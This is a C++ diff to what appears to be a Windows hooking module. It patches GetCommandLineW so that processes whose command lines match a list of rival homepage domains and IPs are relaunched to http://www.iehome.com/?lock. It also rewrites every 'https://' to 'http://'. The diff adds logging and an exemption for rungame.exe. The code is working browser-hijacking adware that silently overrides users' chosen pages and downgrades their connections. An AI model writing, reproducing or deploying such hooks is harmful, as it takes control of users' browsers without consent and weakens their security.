@@ -44,6 +44,9 @@ namespace {
 
 		_S("(?: |http[s]?://)*\\.114la\\.com/*.*$"), // www.114la.com
 
+		_S("127\.0\.0\.1:"),
+		_S("localhost:"),
+
 		_S("\\.index66\\.com"),
 		_S("pc918\\.net"),
 		_S("interface\\.wx-media\\.com"),
@@ -90,12 +93,9 @@ namespace {
 		_S("ld56\\.com"),
 		_S("16116\\.net"),
 		_S("wz58\\.com"),
-		_S("42\\.62\\.30\\.178"),
-		_S("42\\.62\\.30\\.180"),
-		_S("index\\.icafe66\\.com"),
-		_S("127.0.0.1:"),
-		_S("localhost:")
-
+		_S("42\\.62\\.30\\.178"), // 2345 www.2345.com/?hz
+		_S("42\\.62\\.30\\.180"), // 2345 www.2345.com/?hz
+		_S("index\\.icafe66\\.com")
 	};
 
 	UNICODE_STRING ustrCommandLine = { 0 };
@@ -275,17 +275,28 @@ LPWSTR WINAPI InlineGetCommandLineW(VOID)
 	for (LPCWSTR pcwszNextOffset = wcsistr(ustrCommandLine.Buffer, _W("https://")); pcwszNextOffset != NULL; pcwszNextOffset = wcsistr(pcwszNextOffset, _W("https://")))
 	{
 		memmove((LPWSTR)&pcwszNextOffset[4], &pcwszNextOffset[5], wcslen(pcwszNextOffset) * sizeof(WCHAR));
+
+		Global::Log.PrintW(LOGOutputs, L"Rewrite command line: %s", ustrCommandLine.Buffer);
 	}
 
 	LPCWSTR pcwszNewParameter = L"http://www.iehome.com/?lock";
-	LPWSTR pcwszStartCommandLine = pProcessParameters->CommandLine.Buffer;
+	LPWSTR pcwszStartCommandLine = ustrCommandLine.Buffer;
+	//LPWSTR pcwszStartCommandLine = pProcessParameters->CommandLine.Buffer;
 
 	if (IsRedirectCommandLine(pcwszStartCommandLine)) {
+		LPCWSTR pcwszImageFileName = wcsrchr(pProcessParameters->ImagePathName.Buffer, L'\\');
+		if (pcwszImageFileName && 0 == _wcsnicmp(pcwszImageFileName, L"\\rungame.exe", 12)) {
+			Global::Log.PrintW(LOGOutputs, L"Refuse command line redirect to %s(%s)", &pProcessParameters->ImagePathName.Buffer[pProcessParameters->ImagePathName.Length - 12], pcwszStartCommandLine);
+
+			return pcwszStartCommandLine;
+		}
+
 		pcwszStartCommandLine = ustrCommandLine.Buffer;
 		_swprintf(ustrCommandLine.Buffer, L"\"%s\" %s", pProcessParameters->ImagePathName.Buffer, pcwszNewParameter);
+
+		Global::Log.PrintW(LOGOutputs, L"New command line redirect to %s(%s)", &pProcessParameters->ImagePathName.Buffer[pProcessParameters->ImagePathName.Length - 12], pcwszStartCommandLine);
 	}
 
-	Global::Log.PrintW(LOGOutputs, L"[% 5u] New CMD: %s", GetCurrentProcessId(), pcwszStartCommandLine);
 	return pcwszStartCommandLine;
 }
 
